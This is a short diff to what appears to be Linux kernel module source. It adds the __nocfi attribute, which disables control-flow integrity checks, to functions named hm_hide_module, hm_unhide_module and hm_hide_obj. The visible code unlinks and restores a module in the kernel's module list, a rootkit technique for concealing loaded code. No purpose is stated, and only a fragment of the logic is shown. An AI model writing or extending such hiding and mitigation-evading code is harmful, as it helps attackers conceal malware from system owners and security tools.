@@ -86,7 +86,7 @@ static void hm_list_restore(struct list_head *node, struct list_head *anchor)
 	list_add(node, anchor);
 }
 
-static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
+static int __nocfi hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 {
 	struct module *mod = obj->u.mod;
 	struct list_head *anchor;
@@ -112,7 +112,7 @@ static int hm_hide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 	return 0;
 }
 
-static void hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
+static void __nocfi hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 {
 	struct module *mod = obj->u.mod;
 	struct list_head *anchor;
@@ -137,7 +137,7 @@ static void hm_unhide_module(struct hm_ctx *ctx, struct hm_obj *obj)
 		hm_list_restore(&mod->list, anchor);
 }
 
-static int hm_hide_obj(struct hm_ctx *ctx, struct hm_obj *obj)
+static int __nocfi hm_hide_obj(struct hm_ctx *ctx, struct hm_obj *obj)
 {
 	switch (obj->type) {
 	case HM_OBJ_MODULE:
